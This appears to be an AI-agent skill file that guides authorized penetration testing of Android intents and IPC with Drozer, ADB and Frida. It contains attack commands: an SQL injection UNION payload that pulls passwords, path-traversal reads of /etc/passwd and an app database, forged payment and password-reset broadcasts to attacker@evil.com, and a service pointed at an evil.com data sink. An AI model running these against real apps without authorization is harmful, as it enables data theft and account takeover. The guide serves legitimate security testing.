---
name: testing-android-intents-for-vulnerabilities
description: >
  Tests Android inter-process communication (IPC) through intents for vulnerabilities including
  intent injection, unauthorized component access, broadcast sniffing, pending intent hijacking,
  and content provider data leakage. Use when assessing Android app attack surface through exported
  components, testing intent-based data flows, or evaluating IPC security. Activates for requests
  involving Android intent security, IPC testing, exported component analysis, or Drozer assessment.
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags: [mobile-security, android, intents, ipc-security, owasp-mobile, penetration-testing]
version: 1.0.0
license: Apache-2.0
---
# Testing Android Intents for Vulnerabilities

## When to Use

Use this skill when:
- Assessing Android app exported activities, services, receivers, and content providers
- Testing for intent injection and unauthorized component invocation
- Evaluating broadcast receiver security for sensitive data exposure
- Performing IPC-focused penetration testing on Android applications

**Do not use** on production devices without explicit authorization.

## Prerequisites

- Rooted Android device or emulator with ADB
- Drozer agent installed on target device (`drozer agent.apk`)
- Drozer console on host (`pip install drozer`)
- Target APK decompiled with apktool for AndroidManifest.xml analysis
- Frida for runtime intent monitoring

## Workflow

### Step 1: Enumerate Exported Components

```bash
# Using Drozer
drozer console connect
run app.package.info -a com.target.app
run app.package.attacksurface com.target.app

# Output shows:
# X activities exported
# X broadcast receivers exported
# X content providers exported
# X services exported

# List exported activities
run app.activity.info -a com.target.app

# List exported services
run app.service.info -a com.target.app

# List exported receivers
run app.broadcast.info -a com.target.app

# List content providers
run app.provider.info -a com.target.app
```

### Step 2: Test Exported Activities

```bash
# Launch exported activities directly
run app.activity.start --component com.target.app com.target.app.AdminActivity

# Launch with intent extras
run app.activity.start --component com.target.app com.target.app.ProfileActivity \
  --extra string user_id 1337

# Test intent injection via data URI
adb shell am start -a android.intent.action.VIEW \
  -d "content://com.target.app/users/admin" com.target.app

# If admin activity opens without auth, report as authorization bypass
```

### Step 3: Test Broadcast Receivers

```bash
# Send broadcast to exported receivers
run app.broadcast.send --action com.target.app.PROCESS_PAYMENT \
  --extra string amount "0.01" --extra string recipient "attacker"

# Sniff broadcasts for sensitive data
run app.broadcast.sniff --action com.target.app.USER_LOGIN

# Via ADB
adb shell am broadcast -a com.target.app.RESET_PASSWORD \
  --es email "attacker@evil.com"
```

### Step 4: Test Content Providers

```bash
# Query content providers for data leakage
run app.provider.query content://com.target.app.provider/users
run app.provider.query content://com.target.app.provider/users --projection "password"

# Test SQL injection in content providers
run app.provider.query content://com.target.app.provider/users \
  --selection "1=1) UNION SELECT username,password FROM users--"

# Test path traversal
run app.provider.read content://com.target.app.provider/../../etc/passwd
run app.provider.download content://com.target.app.provider/../databases/app.db /tmp/stolen.db

# Find injectable providers
run scanner.provider.injection -a com.target.app
run scanner.provider.traversal -a com.target.app
```

### Step 5: Test Pending Intent Vulnerabilities

```javascript
// Monitor PendingIntent creation via Frida
Java.perform(function() {
    var PendingIntent = Java.use("android.app.PendingIntent");

    PendingIntent.getActivity.overload("android.content.Context", "int",
        "android.content.Intent", "int").implementation =
        function(context, requestCode, intent, flags) {
            console.log("[PendingIntent] getActivity:");
            console.log("  Intent: " + intent.toString());
            console.log("  Flags: " + flags);

            // Check for FLAG_IMMUTABLE (secure) vs FLAG_MUTABLE (vulnerable)
            var FLAG_MUTABLE = 0x02000000;
            if ((flags & FLAG_MUTABLE) !== 0) {
                console.log("  [VULN] FLAG_MUTABLE - PendingIntent can be modified by receiver");
            }
            return this.getActivity(context, requestCode, intent, flags);
        };
});
```

### Step 6: Test Service Binding

```bash
# Attempt to bind to exported services
run app.service.start --action com.target.app.SYNC_SERVICE \
  --extra string server "https://evil.com/data_sink"

run app.service.send com.target.app com.target.app.MessengerService \
  --msg 1 0 0 --extra string command "dump_database" --bundle-as-obj
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **Exported Component** | Android component (activity/service/receiver/provider) accessible to other apps on the device |
| **Intent** | Messaging object for requesting actions from other components; can be explicit (target specified) or implicit (action-based) |
| **Pending Intent** | Token wrapping an intent for future execution by another app; mutable PendingIntents can be modified by recipients |
| **Content Provider** | Component for structured data sharing between apps; SQL injection target if query parameters are not sanitized |
| **Broadcast Receiver** | Component receiving system or app broadcasts; exported receivers can be triggered by any app |

## Tools & Systems

- **Drozer**: Android security assessment framework for IPC testing with pre-built modules
- **ADB**: Command-line tool for invoking intents, starting activities, and sending broadcasts
- **Frida**: Runtime monitoring of intent handling and PendingIntent creation
- **apktool**: APK decompilation for AndroidManifest.xml analysis of component export status
- **Intent Fuzzer**: Automated tool for fuzzing intent parameters across exported components

## Common Pitfalls

- **android:exported default changed in API 31**: Components with intent filters default to exported=true below API 31 but exported=false at API 31+. Check targetSdkVersion.
- **Permission-protected components**: An exported component may still require a permission. Test with and without the required permission.
- **Implicit intents vs explicit**: Only implicit intents (action-based) are interceptable by other apps. Explicit intents (specifying target) are secure.
- **Custom permissions**: Apps can define custom permissions with different protection levels (normal, dangerous, signature). Signature-level permissions are only grantable to apps signed with the same certificate.
